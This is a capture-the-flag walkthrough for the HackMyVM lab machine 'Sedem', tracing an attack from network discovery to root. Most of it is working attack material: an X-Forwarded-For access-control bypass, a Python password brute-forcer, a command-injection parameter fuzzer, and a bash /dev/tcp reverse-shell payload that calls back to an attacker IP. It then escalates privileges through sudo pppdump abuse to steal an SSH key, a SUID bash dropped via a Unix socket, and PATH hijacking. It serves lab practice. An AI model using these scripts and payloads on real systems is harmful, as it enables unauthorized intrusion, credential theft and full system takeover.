# HackMyVM — Sedem

![NEE](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q1.png)
## Machine Information

- **Machine:** Sedem
- **Platform:** HackMyVM
- **Operating System:** Linux
- **Difficulty:** Easy
- **Target IP:** `192.168.56.148`

---

## 1. Discovering the Target IP

We are back with another HackMyVM challenge, this time targeting a Linux-based machine named **Sedem**.

Since the target IP was not immediately known, we used `netdiscover` to identify devices on the local network.

![Netdiscover Output](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q2.png)

```bash
sudo netdiscover -i eth1
```

The scan revealed the following devices:

```text
192.168.56.1
192.168.56.100
192.168.56.148
192.168.111.1
```

Our target was identified as:

```text
Target IP: 192.168.56.148
```

---

## 2. Initial Enumeration

We started with an all-port Nmap scan.

![Nmap All Ports Scan](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q3.png)

```bash
nmap -p- 192.168.56.148
```

The scan revealed two open ports:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Next, we performed service and version detection.

![Nmap Service Detection](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q4.png)

```bash
nmap -sC -sV -p 22,80 192.168.56.148
```

Important results:

```text
22/tcp open  ssh   OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http  Apache httpd 2.4.38 (Debian)
```

The target was running Linux, with SSH and an Apache web server exposed.

---

## 3. Web Enumeration

We opened the web application in the browser and inspected the page.

![Sedem Webpage](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q5.png)

The webpage displayed an image without much additional information. We also downloaded the image to inspect it, but this did not reveal anything useful.

Next, we enumerated web directories using Gobuster.

![Gobuster Results](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q6.png)

```bash
gobuster dir -u http://192.168.56.148/ \
-w /usr/share/wordlists/dirb/common.txt
```

Among the discovered paths were:

```text
.htaccess       403
.htpasswd       403
/manual/        301
/server-status  403
/sysadmin/      301
```

The `/sysadmin/` directory looked particularly interesting.

---

## 4. Bypassing the IP-Based Restriction

When examining `/sysadmin/`, we discovered that access was restricted based on the client's IP address.

We tested the `X-Forwarded-For` HTTP header and found that setting it to the loopback address bypassed the restriction.

![Burp Suite Response](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q7.png)

The important header was:

```http
X-Forwarded-For: 127.0.0.1
```

This allowed us to access the restricted `/sysadmin/` functionality.

The application appeared to trust a client-controlled HTTP header when deciding whether the request originated from localhost.

---

## 5. Brute-Forcing the Admin Password

With access to the login functionality, we assumed the username was `admin` and wrote a Python script to test passwords from `rockyou.txt`.

```python
import requests

fail = 'try login :('

with open('/usr/share/wordlists/rockyou.txt', 'r') as file:
    for f in file:
        password = f.strip()

        url = 'http://192.168.56.148/sysadmin/'
        headers = {'X-Forwarded-For': '127.0.0.1'}

        payload = {
            'username': 'admin',
            'password': password,
            'submit': 'Submit'
        }

        response = requests.post(
            url,
            headers=headers,
            data=payload
        )

        if fail in response.text:
            print(f"Password not found! -- {password}")
        else:
            print(f"Password found! -- {password}")
            break
```

![Admin Password Found](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q8.png)

The credentials discovered were:

```text
Username: admin
Password: fucker1
```

Using these credentials, we gained access to the admin dashboard.

---

## 6. Discovering a Command Injection Parameter

After logging in, we inspected the page source and found an interesting comment.

![Source Code Message](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q9.png)

```html
<!--
You don't need a clue, you are so beautiful, sharp, clear and strong
that you can do everything by yourself
-->
```

We continued examining the application's functionality. Instead of testing parameters manually through Burp Suite, we wrote a Python script to fuzz possible query parameters.

```python
import requests

counter = 0

url = 'http://192.168.56.148/sysadmin/index.php'
wordlist = '/usr/share/wordlists/wfuzz/general/big.txt'

headers = {'X-Forwarded-For': '127.0.0.1'}

payload = {
    'username': 'admin',
    'password': 'fucker1',
    'submit': 'Submit'
}

with requests.Session() as session:
    session.post(url, headers=headers, data=payload)

    with open(wordlist, 'r') as file:
        for f in file:
            parameter = f.strip()

            test_url = (
                'http://192.168.56.148/sysadmin/system/index.php'
                f'?{parameter}=ls'
            )

            response = session.get(
                test_url,
                headers=headers
            )

            if len(response.content) > 920:
                print(f"Found parameter: {parameter}")
                break

            counter += 1
            print(f"Fuzzed parameters: {counter}")
```

![Command Injection Parameter](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q10.png)

The fuzzing process helped identify a parameter that could be used to execute system commands through the application.

---

## 7. Getting a Reverse Shell

After identifying the command execution functionality, we prepared a reverse shell payload.

On the attacking machine, we started a Netcat listener:

```bash
nc -lvnp 4444
```

We then submitted the following payload through the vulnerable parameter:

```text
bash+-c+'exec+bash+-i+%26>/dev/tcp/192.168.56.106/4444+<%261'
```

![Reverse Shell](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q11.png)

The connection was received successfully:

```text
Connection received on 192.168.56.148
www-data@sedem:/var/www/html/sysadmin/system$
```

We obtained a shell as `www-data`.

---

## 8. Stabilizing the Shell

The initial reverse shell was unstable, so we upgraded it to a proper interactive shell.

First, run:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press `Ctrl+Z` to suspend the session and run these commands in the local terminal:

```bash
stty raw -echo
fg
```

After returning to the reverse shell:

```bash
export TERM=xterm
```

We now had a more usable interactive shell.

---

## 9. Privilege Escalation: www-data to user1

We enumerated the available users and checked the current account's sudo permissions.

![Sudo Permissions](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q12.png)

```bash
sudo -l
```

The output showed:

```text
User www-data may run the following commands on sedem:

(user1) NOPASSWD: /usr/sbin/pppdump
```

This meant that `www-data` could execute `pppdump` as `user1` without a password.

We investigated how `pppdump` processed its input and found that its output could be used to recover data represented as hexadecimal bytes.

The following command was used to process `user1`'s SSH private key:

```bash
sudo -u user1 /usr/sbin/pppdump .ssh/id_rsa > /tmp/id
```

We then decoded the hexadecimal output with Python.

```python
import re
from pathlib import Path

path = Path("/tmp/id")
data = path.read_text()

matches = re.findall(
    r"^\?([0-9a-fA-F]{2})\s*$",
    data,
    re.MULTILINE
)

lines = [line.strip() for line in data.splitlines() if line.strip()]

assert len(matches) == len(lines), (
    "Unexpected input: not every line is a ?XX hex byte"
)

decoded = bytes.fromhex(" ".join(matches))
Path("/tmp/id_decoded").write_bytes(decoded)

print(f"Decoded {len(decoded)} bytes into /tmp/id_decoded")
```

The decoded file could then be used as the SSH private key for `user1`, provided the output was a valid key.

After transferring the recovered key to the attacking machine and setting its permissions, we connected as `user1`.

```bash
chmod 600 id_decoded
ssh -i id_decoded user1@192.168.56.148
```

![User1 Shell](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q15.png)

---

## 10. Privilege Escalation: user1 to user2

Once connected as `user1`, we checked sudo permissions again.

```bash
sudo -l
```

The output showed:

```text
User user1 may run the following commands:

(user2) NOPASSWD: /usr/bin/python /home/user2/socket/code.py
```

The Python script operated through a Unix-domain socket. We used two shell sessions to interact with the process.

### Shell 1: Start the permitted Python script

```bash
sudo -u user2 /usr/bin/python /home/user2/socket/code.py
```

### Shell 2: Send a command through the Unix socket

```bash
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" \
| socat - UNIX-CLIENT:/home/user2/socket/socket_test.s
```

The command created a copy of Bash with the SUID bit enabled.

We then executed it:

```bash
/tmp/bash -p
```

And verified the resulting identity:

```bash
whoami
```

Output:

```text
user2
```

![User2 Shell](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q16.png)

We had successfully escalated from `user1` to `user2`.

---

## 11. Privilege Escalation: user2 to user3

While enumerating the home directories, we found a `TODO` file in `user3`'s directory that we could not read.

Further inspection revealed a hidden file named `.privacy.txt`.

```bash
cat .privacy.txt
```

It contained the following hash:

```text
651d1fcb18b7da23658c394fe9acc05135054b262422b131fbabe4f9def2e396095403da0225a45369ee3cf2b3be0c3733b6bc7d899e4531ba5ce7dc47be67ee
```

Our notes associated this hash with the Whirlpool algorithm and the candidate password `nopassword`.

We used the recovered credential to access `user3`.

![User3 Shell](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q17.png)

---

## 12. Root Privilege Escalation

After obtaining access as `user3`, we continued enumerating the filesystem and discovered a binary named `/opt/check`.

Further investigation indicated that the binary attempted to execute:

```bash
service apache2 status
```

However, the command was not found when the binary ran.

This suggested a possible **PATH hijacking vulnerability**: if the program invoked `service` without an absolute path, we could potentially place a malicious executable earlier in the `PATH`.

### Step 1: Create a malicious service executable

We created a file named `service` in `/tmp`:

```bash
cd /tmp

printf '#!/bin/bash\nchmod +s /bin/bash\n' > service

chmod +x service
```

The script would set the SUID bit on `/bin/bash`.

### Step 2: Modify PATH

```bash
export PATH="/tmp:$PATH"
```

This made `/tmp/service` take precedence when the binary attempted to execute `service`.

### Step 3: Execute the vulnerable binary

```bash
/opt/check
```

After execution, we checked the permissions of Bash:

```bash
ls -l /bin/bash
```

The output showed the SUID bit had been set:

```text
-rwsr-sr-x 1 root root ... /bin/bash
```

### Step 4: Obtain a root shell

We launched Bash in privileged mode:

```bash
/bin/bash -p
```

Then verified our privileges:

```bash
id
```

Output:

```text
uid=1002(user3) gid=1002(user3) euid=0(root) egid=0(root) groups=0(root),1002(user3)
```

![Root Shell](https://github.com/naval0505/HackMyVM/blob/47cdd68e4f7e3284e8ddf6bd7a1b605d4b056c1c/Sedem%20-%20HackMyVM%20Writeup/Images/q19.png)

The effective UID was `0`, confirming that we had obtained root privileges.

---

## Attack Chain

```text
IP Discovery with netdiscover
        |
        v
Nmap Enumeration
        |
        v
HTTP Directory Enumeration
        |
        v
X-Forwarded-For Restriction Bypass
        |
        v
Admin Password Brute Force
        |
        v
Command Injection Parameter Discovery
        |
        v
Reverse Shell as www-data
        |
        v
Sudo pppdump Abuse
        |
        v
Recover user1 SSH Private Key
        |
        v
SSH Access as user1
        |
        v
Sudo Python Script + Unix Socket
        |
        v
SUID Bash as user2
        |
        v
Recover user3 Credentials
        |
        v
PATH Hijacking through /opt/check
        |
        v
Root Shell
```

---

## Key Takeaways

- `netdiscover` can help identify targets on a local virtual network.
- Directory enumeration can reveal hidden administrative functionality.
- Trusting `X-Forwarded-For` for access control can allow clients to spoof their apparent source address.
- Weak passwords can expose administrative interfaces to brute-force attacks.
- Parameter fuzzing can help discover undocumented command execution functionality.
- Sudo permissions must be checked after every privilege transition.
- Utilities such as `pppdump` should not be granted excessive sudo permissions.
- Unix-domain sockets and privileged Python scripts require careful access control.
- Executing commands without absolute paths can introduce PATH hijacking vulnerabilities.
- SUID binaries and scripts can create serious privilege-escalation risks.

---

## Final Result

**Machine Pwned.**
**Jai Shri Ram**

The final privilege escalation relied on PATH hijacking through `/opt/check`, allowing a `user3` shell to obtain an effective root identity.
